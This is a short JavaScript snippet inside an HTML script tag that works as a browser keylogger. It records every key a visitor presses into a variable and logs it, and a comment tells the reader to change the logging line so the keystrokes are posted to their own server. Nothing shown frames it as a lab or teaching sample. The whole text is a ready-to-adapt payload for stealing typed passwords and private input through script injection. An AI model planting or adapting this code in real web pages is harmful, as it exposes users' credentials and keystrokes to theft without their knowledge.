<script type="text/javascript">
  let l = "";                              // Variable to store key-strokes in
  document.onkeypress = function (e) 
  { 
    // Event to listen for key presses
    l += e.key;                             // If user types, log it to the l variable
    console.log(l);                         // update this line to post to your own server
  }
</script>
